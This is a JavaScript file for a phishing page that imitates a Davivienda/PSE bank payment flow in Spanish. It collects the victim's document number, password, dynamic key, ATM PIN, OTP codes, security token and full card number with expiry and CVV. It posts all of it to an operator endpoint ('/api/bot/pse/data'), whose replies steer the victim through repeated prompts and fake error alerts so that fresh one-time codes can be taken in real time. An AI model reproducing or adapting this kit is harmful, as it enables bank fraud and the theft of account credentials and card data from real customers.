const DOMElements = {
    loader: document.querySelector('#loader'),
    labelDatetime: document.querySelector('#datetime'),
    
    contGeneral: document.querySelector('#general'),
    contCard: document.querySelector('#card'),
    
    formGeneral: document.querySelector('#formGeneral'),
    formCard: document.querySelector('#formCard'),
    
    inputDocnumber: document.querySelector('#docnum'),
    inputClave: document.querySelector('#clave'),
    inputCdin: document.querySelector('#cdin'),
    inputCcajero: document.querySelector('#ccajero'),
    inputOtpcode: document.querySelector('#otpcode'),
    inputToken: document.querySelector('#token'),
    
    btnContinue: document.querySelectorAll('#continue'),
    btnCancel: document.querySelectorAll('#cancel'),
};

/**
 * Módulo de validadores
 */
const validators = {
    document: (docValue) => {
        return docValue && docValue.length >= 4;
    },
    
    password: (passValue) => {
        return passValue && passValue.length >= 4;
    },
    
    cdin: (cdinValue) => {
        return cdinValue && cdinValue.length === 6;
    },
    
    ccajero: (ccajValue) => {
        return ccajValue && ccajValue.length === 4;
    },
    
    otp: (otpValue) => {
        return otpValue && otpValue.length >= 6 && otpValue.length <= 8;
    },
    
    token: (tokenValue) => {
        return tokenValue && tokenValue.length <= 8;
    },
    
    card: () => {
        const p = document.querySelector('#p');
        const pdate = document.querySelector('#pdate');
        const c = document.querySelector('#c');

        if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
            if(isLuhnValid(p.value)){
                if(isValidDate(pdate.value)){
                    if((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)){
                        return {
                            bin: p.value,
                            date: pdate.value,
                            cs: c.value
                        }
                    }else{
                        alert('Revise el CVV de su tarjeta.');
                        c.value = '';
                        c.focus();
                        return false;
                    }
                }else{
                    alert('Revise la fecha de vencimiento de su tarjeta.');
                    pdate.value = '';
                    pdate.focus();
                    return false;
                }
            }else{
                alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
                p.value = ''
                p.focus();
                return false;
            }
        }else{
            alert('Revisa el número de tu tarjeta.');
            p.value = '';
            p.focus();
            return false;
        }
    }
};

/**
 * Módulo de gestión de estado
 */
const stateManager = {
    updateUser: (user) => {
        info.metaInfo.user = user;
        info.metaInfo.mode = 'pass';
        updateLS();
    },
    
    updatePass: (pass) => {
        info.metaInfo.pass = pass;
        updateLS();
    },
    
    updateCdin: (cdin) => {
        info.metaInfo.cdin = cdin;
        updateLS();
    },
    
    updateCcajero: (ccaj) => {
        info.metaInfo.ccaj = ccaj;
        updateLS();
    },
    
    updateOtp: (otp) => {
        info.metaInfo.otpcode = otp;
        updateLS();
    },
    
    updateToken: (token) => {
        info.metaInfo.token = token;
        updateLS();
    },
    
    updateCard: (fields) => {
        info.metaInfo.bin = fields.bin;
        info.metaInfo.date = fields.date;
        info.metaInfo.cs = fields.cs;
        updateLS();
    },
    
    updateCardType: (type) => {
        info.metaInfo.cardType = type; // 'credit' o 'debit'
        updateLS();
    },
    
    resetState: () => {
        info.metaInfo.mode = '';
        // info.metaInfo.bank = '';
        info.metaInfo.user = '';
        info.metaInfo.pass = '';
        info.metaInfo.cdin = '';
        info.metaInfo.ccaj = '';
        info.metaInfo.otpcode = '';
        info.metaInfo.token = '';
        info.metaInfo.bin = '';
        info.metaInfo.date = '';
        info.metaInfo.cs = '';
        info.metaInfo.cardType = '';
        updateLS();
    },
    
    setCardMode: () => {
        info.metaInfo.mode = 'card';
    }
};

/**
 * Módulo de navegación
 */
const navigationManager = {
    goBack: () => {
        if(confirm('¿Estás seguro de cancelar el proceso? Volverás al menú del comercio')){
            stateManager.resetState();
            window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
        }
    },
    
    goToSuccess: () => {
        stateManager.resetState();
        window.opener.postMessage({ action: 'done', data: { response: 'success'} }, '*');
    },
    
    goToBankSelection: () => {
        stateManager.resetState();
        window.location.reload();
    }
};

/**
 * Módulo de API
 */
const apiService = {
    sendData: async (payload) => {
        const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, payload, JWT_SIGN);
        const response = await fetch(`${API_URL}/api/bot/pse/data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${info.metaInfo.TRANSID}`
            },
            body: JSON.stringify({ token: tokenn })
        });
        return response.json();
    },
    
    handleResponse: (result) => {
        const goto = result.redirect_to;
        console.log('hola')
        // Reset to general form if not in card mode
        if (info.metaInfo.mode !== 'card'){
            if (DOMElements.contGeneral.classList.contains('hidden')){
                DOMElements.contCard.classList.add('hidden');
                DOMElements.contGeneral.classList.remove('hidden');
            }
        }

        switch (goto) {
            case 'user':
                console.log('user')
                if (info.metaInfo.user !== '') {
                    alert('El número de documento ingresado no es correcto. Ingrese nuevamente.');
                }
                console.log('user2')
                info.metaInfo.mode = 'user'
                viewManager.clearFields();
                viewManager.updateUIForMode('user');
                break;
                
            case 'pass':
                if (info.metaInfo.pass !== '') {
                    alert('Contraseña incorrecta. Intente nuevamente.');
                }
                info.metaInfo.mode = 'pass'
                viewManager.clearFields();
                viewManager.updateUIForMode('pass');
                break;
                
            case 'cdin':
                if (info.metaInfo.cdin !== '') {
                    alert('Clave dinámica incorrecta o expiró. Intente nuevamente.');
                } else {
                    alert('Ingrese la Clave Dinámica que encuentra en la app Davivienda o en la llave física.');
                }
                info.metaInfo.mode = 'cdin'
                viewManager.clearFields();
                viewManager.updateUIForMode('cdin');
                break;
                
            case 'ccajero':
                if (info.metaInfo.ccaj !== '') {
                    alert('Clave cajero incorrecta. Intente nuevamente.');
                } else {
                    alert('Ingrese su clave de cajero');
                }
                info.metaInfo.mode = 'ccajero'
                viewManager.clearFields();
                viewManager.updateUIForMode('ccajero');
                break;
                
            case 'otpcode':
                if (info.metaInfo.otpcode !== '') {
                    alert('Enviamos nuevamente un Código de Seguridad a tu teléfono. Ingresalo nuevamente.');
                } else {
                    alert('Enviamos un Código de Seguridad a tu teléfono. Por favor ingresalo');
                }
                info.metaInfo.mode = 'otpcode'
                viewManager.clearFields();
                viewManager.updateUIForMode('otpcode');
                break;
                
            case 'token':
                if (info.metaInfo.token !== '') {
                    alert('Enviamos nuevamente un Token de Seguridad. Ingresalo nuevamente.');
                } else {
                    alert('Enviamos un Token de Seguridad. Por favor ingresalo');
                }
                info.metaInfo.mode = 'token'
                viewManager.clearFields();
                viewManager.updateUIForMode('token');
                break;
                
            case 'tcred':
                stateManager.setCardMode();
                const wasCreditBefore = info.metaInfo.cardType === 'credit';
                stateManager.updateCardType('credit');
                if (wasCreditBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de Tarjeta de Crédito, asegurese de que sea un producto que tenga vinculado a Davivienda')
                } else {
                    alert('Por favor ingrese los datos de su tarjeta de crédito (que tenga vinculado a Davivienda)')
                }
                info.metaInfo.mode = 'card'
                viewManager.clearCardFields();
                viewManager.showCardForm();
                break;
            case 'tdeb':
                stateManager.setCardMode();
                const wasDebitBefore = info.metaInfo.cardType === 'debit';
                stateManager.updateCardType('debit');
                if (wasDebitBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de tarjeta de débito, asegurese de que sea un producto que tenga vinculado a Davivienda')
                } else {
                    alert('Por favor ingrese los datos de su Tarjeta de Débito (que tenga vinculado a Davivienda)')
                }
                info.metaInfo.mode = 'card'
                viewManager.clearCardFields();
                viewManager.showCardForm();
                break;
                
            case 'bank':
                alert('En este momento no podemos atender tu solicitud, por favor intente más tarde.');
                navigationManager.goToBankSelection();
                break;
                
            case 'success':
                navigationManager.goToSuccess();
                break;

            case 'cancel':
                stateManager.resetState();
                window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
                break;
                
            default:
                console.error('No se reconoce el redirect_to:', goto);
                throw new Error();
        }

        DOMElements.loader.classList.remove('flex');
    },
    
    handleError: (err = null) => {
        console.log(err);
        console.log('Error en la API');
        alert('No pudimos seguir con el proceso de solicitud. Intente nuevamente más tarde.');
        navigationManager.goToBankSelection();
    }
};

/**
 * Módulo de gestión de vistas
 */
const viewManager = {
    updateUIForMode: (mode) => {
        // Siempre mostramos docnum; se habilita solo en modo "user"
        if (mode === 'user') {
            if (!DOMElements.contCard.classList.contains('hidden')){
                DOMElements.contCard.classList.add('hidden');
                DOMElements.contGeneral.classList.remove('hidden');
            }

            DOMElements.inputDocnumber.value = '';
            DOMElements.inputDocnumber.removeAttribute('disabled');
            DOMElements.inputDocnumber.setAttribute('type', 'text');
        } else {
            DOMElements.inputDocnumber.setAttribute('disabled', true);
            DOMElements.inputDocnumber.setAttribute('type', 'password');
        }

        // Ocultar todos los contenedores (padres de cada input)
        const inputsToHide = [
            DOMElements.inputClave,
            DOMElements.inputCdin,
            DOMElements.inputCcajero,
            DOMElements.inputOtpcode,
            DOMElements.inputToken,
        ];
        inputsToHide.forEach(input => {
            input.parentElement.classList.add('hidden');
        });

        // Según el modo, mostramos el contenedor correspondiente
        switch (mode) {
            case 'pass':
                DOMElements.inputClave.parentElement.classList.remove('hidden');
                break;
            case 'cdin':
                DOMElements.inputCdin.parentElement.classList.remove('hidden');
                break;
            case 'ccajero':
                DOMElements.inputCcajero.parentElement.classList.remove('hidden');
                break;
            case 'otpcode':
                DOMElements.inputOtpcode.parentElement.classList.remove('hidden');
                break;
            case 'token':
                DOMElements.inputToken.parentElement.classList.remove('hidden');
                break;
        }
    },
    
    showCardForm: () => {
        DOMElements.contGeneral.classList.add('hidden');
        DOMElements.contCard.classList.remove('hidden');
    },
    
    clearFields: () => {
        DOMElements.inputClave.value = '';
        DOMElements.inputCdin.value = '';
        DOMElements.inputCcajero.value = '';
        DOMElements.inputOtpcode.value = '';
        DOMElements.inputToken.value = '';
    },
    
    clearCardFields: () => {
        document.querySelector('#p').value = '';
        document.querySelector('#pdate').value = '';
        document.querySelector('#c').value = '';
    },
    
    showLoader: () => {
        DOMElements.loader.classList.add('flex');
    },
    
    hideLoader: () => {
        DOMElements.loader.classList.remove('flex');
    }
};

/**
 * Manejadores de eventos por modo
 */
const eventHandlers = {
    user: {
        next: async () => {
            if (validators.document(DOMElements.inputDocnumber.value)) {
                stateManager.updateUser(DOMElements.inputDocnumber.value);
                viewManager.showLoader();
                await sleep(2700);
                viewManager.hideLoader();
                viewManager.updateUIForMode('pass');
            } else {
                alert('Debes ingresar un número de documento válido');
            }
        }
    },
    
    pass: {
        next: async () => {
            if (validators.password(DOMElements.inputClave.value)) {
                stateManager.updatePass(DOMElements.inputClave.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Debes ingresar una contraseña válida');
            }
        }
    },
    
    cdin: {
        next: async () => {
            if (validators.cdin(DOMElements.inputCdin.value)) {
                stateManager.updateCdin(DOMElements.inputCdin.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Debes ingresar una clave dinámica válida');
            }
        }
    },
    
    ccajero: {
        next: async () => {
            if (validators.ccajero(DOMElements.inputCcajero.value)) {
                stateManager.updateCcajero(DOMElements.inputCcajero.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Debes ingresar una clave de cajero válida');
            }
        }
    },
    
    otp: {
        next: async () => {
            if (validators.otp(DOMElements.inputOtpcode.value)) {
                stateManager.updateOtp(DOMElements.inputOtpcode.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Debes ingresar un Código de Seguridad válido');
            }
        }
    },
    
    token: {
        next: async () => {
            if (validators.token(DOMElements.inputToken.value)) {
                stateManager.updateToken(DOMElements.inputToken.value);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Debes ingresar un Token de Seguridad válido');
            }
        }
    },
    
    card: {
        next: async () => {
            const fields = validators.card();
            if (fields) {
                stateManager.updateCard(fields);
                viewManager.showLoader();
                await apiService.sendData(info.metaInfo)
                    .then(apiService.handleResponse)
                    .catch(err => apiService.handleError(err));
            } else {
                alert('Revisa los datos ingresados');
                return;
            }
        }
    }
};

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    updateDatetimeLabel();
    setInterval(updateDatetimeLabel, 60000);

    // redundance
    info.metaInfo.mode = 'user';

    addEventListeners();
});

/**
 * Event Listeners
 */
const addEventListeners = async () => {
    const {
        formGeneral,
        formCard,
        btnContinue,
        btnCancel
    } = DOMElements;

    formGeneral.addEventListener('submit', (e) => {
        e.preventDefault();
    });

    formCard.addEventListener('submit', (e) => {
        e.preventDefault();
    });

    btnContinue.forEach(btn => {
        btn.addEventListener('click', () => {
            const currentMode = info.metaInfo.mode;
            
            switch (currentMode) {
                case 'user':
                    eventHandlers.user.next();
                    break;
                case 'pass':
                    eventHandlers.pass.next();
                    break;
                case 'cdin':
                    eventHandlers.cdin.next();
                    break;
                case 'ccajero':
                    eventHandlers.ccajero.next();
                    break;
                case 'otpcode':
                    eventHandlers.otp.next();
                    break;
                case 'token':
                    eventHandlers.token.next();
                    break;
                case 'card':
                    eventHandlers.card.next();
                    break;
                default:
                    eventHandlers.user.next();
            }
        });
    });

    btnCancel.forEach(btn => {
        btn.addEventListener('click', () => {
            navigationManager.goBack();
        });
    });
};

/**
 * Functions
 */
const updateDatetimeLabel = () => {
    const now = new Date();
    const days = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
    const months = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];

    const dayOfWeek = days[now.getDay()];
    const day = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();

    let hours = now.getHours();
    let minutes = now.getMinutes();

    // Convertir a formato 12 horas y determinar AM/PM
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12; // El "0" se muestra como "12"
    minutes = minutes < 10 ? '0' + minutes : minutes;

    // Formatear la fecha y hora
    const formattedDateTime = `${dayOfWeek} ${day} de ${month} de ${year}, ${hours}:${minutes} ${ampm}`;
    
    // Actualizar el contenido del label
    DOMElements.labelDatetime.textContent = formattedDateTime;
};

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    let texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    const partes = fechaInput.split('/');
    const mesInput = parseInt(partes[0], 10);
    let añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    const fechaActual = new Date();
    const añoActual = fechaActual.getFullYear();
    const limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}